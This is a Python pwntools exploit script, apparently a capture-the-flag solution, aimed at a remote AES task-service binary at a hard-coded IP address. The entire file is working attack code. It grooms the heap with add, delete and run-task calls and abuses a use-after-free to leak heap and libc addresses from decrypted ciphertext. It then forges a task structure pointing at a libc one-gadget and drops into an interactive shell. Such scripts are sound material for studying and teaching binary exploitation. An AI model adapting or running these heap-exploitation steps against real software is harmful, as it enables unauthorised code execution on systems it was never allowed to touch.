from pwn import *
from Crypto.Cipher import AES

r = remote('111.186.63.201', 10001)


def sa(a, b):
	#return r.sendafter(a, b)
	return r.send(b) #we can use send instead of sendafter. we want to do this because sendafter takes too long on the remote server.

def ru(a):
	return r.recvuntil(a)

def menu(choice):
	r.send(str(choice) + '\n')

def add_task(task_id, encrypt_decrypt, key, iv, size, data):
	menu(1)
	sa(': ', str(task_id) + '\n')
	sa(': ', str(encrypt_decrypt) + '\n')
	sa(': ', key.ljust(0x20, '\x00'))
	sa(': ', iv.ljust(0x10, '\x00'))
	sa(': ', str(size) + '\n')
	sa(': ', data.ljust(size, '\x00'))

def del_task(task_id):
	menu(2)
	sa(': ', str(task_id) + '\n')

def go(task_id):
	menu(3)
	sa(': ', str(task_id) + '\n')

def get_ciphertext(length):
	ru('Ciphertext: \n')
	ciphertext = r.recv(length*3 + length/0x10)
	ciphertext = ciphertext.replace(' ', '').replace('\n', '').decode('hex')
	return ciphertext

def aes_decrypt(data, key, iv):
	aes = AES.new(key.ljust(0x20, '\x00'), AES.MODE_CBC, iv.ljust(0x10, '\x00'))
	return aes.decrypt(data)

def aes_encrypt(data, key, iv):
	aes = AES.new(key.ljust(0x20, '\x00'), AES.MODE_CBC, iv.ljust(0x10, '\x00'))
	return aes.encrypt(data.ljust(16,'\x00'))

add_task(0, 1, 'test', '1234', 8, 'AAAA')
add_task(1, 1, 'test', '1234', 8, 'BBBB')
add_task(2, 1, 'test', '1234', 8, 'CCCC')
add_task(3, 1, 'test', '1234', 8, 'DDDD')
add_task(4, 1, 'test', '1234', 8, 'EEEE')

go(2)

log.info('Starting')

del_task(0)
del_task(1)
del_task(2)
del_task(3)
del_task(4)

add_task(5, 1, 'test', '1234', 0xa0, 'FFFF')
add_task(6, 1, 'test', '1234', 8, 'GGGG')

log.info('Waiting on response')

ciphertext = get_ciphertext(16)

heap = u64(aes_decrypt(ciphertext, 'test', '1234')[:6].ljust(8, '\x00')) - 0x1280

log.success('Heap @ ' + hex(heap))

add_task(7, 1, 'test', '1234', 0x1000, 'HHHH')
add_task(8, 1, 'test', '1234', 8, 'IIII')

go(7)

del_task(7)
del_task(8)

add_task(9, 1, 'test', '1234', 0x70, p64(heap + 0x1f80) + p64(0x8) + p32(0x1) + 'test'.ljust(0x20, '\x00') + '1234'.ljust(0x10, '\x00') + p32(0x0) + p64(0x0)*2 + p64(heap + 0x1300) + p64(0x1337))

libc = u64(aes_decrypt(get_ciphertext(16), 'test', '1234')[:6].ljust(8, '\x00')) - 0x3ebca0# + i

log.success('Libc @ ' + hex(libc))

add_task(10, 1, 'test', '1234', 8, 'JJJJ')
add_task(11, 1, 'test', '1234', 8, 'KKKK')

go(10)

del_task(10)
del_task(11)

add_task(12, 1, 'test', '1234', 0x70, p64(heap + 0x1300) + p64(0x40) + p32(0x1) + 'test'.ljust(0x20, '\x00') + '1234'.ljust(0x10, '\x00') + p32(0x0) + p64(0x0)*2 + p64(heap + 0x2350) + p64(0xc0de))

data = ''
data += '\x00'*0x100
data += p64(heap + 0x2350 + 0x100) + p64(0x0) + p32(0x1337c0de) + p32(0x10)
data += '\x00'*(0x200 - len(data))
data += p32(0x0) + p32(0x10)
data += p64(0x0)*3
data += p64(libc + 0x00000000000E5863)

add_task(13, 1, 'test', '1234', 0x300, data)

r.interactive()
